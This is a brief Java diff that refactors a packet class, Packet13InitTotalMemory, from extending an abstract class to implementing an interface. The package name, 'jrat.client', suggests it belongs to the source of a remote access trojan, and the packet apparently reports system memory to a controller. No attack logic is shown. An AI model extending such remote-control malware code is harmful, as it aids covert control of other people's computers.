@@ -6,7 +6,7 @@ import jrat.client.Connection;
 import java.lang.management.ManagementFactory;
 
 
-public class Packet13InitTotalMemory extends AbstractOutgoingPacket {
+public class Packet13InitTotalMemory implements OutgoingPacket {
 
 	@Override
 	public void write(Connection dos) throws Exception {
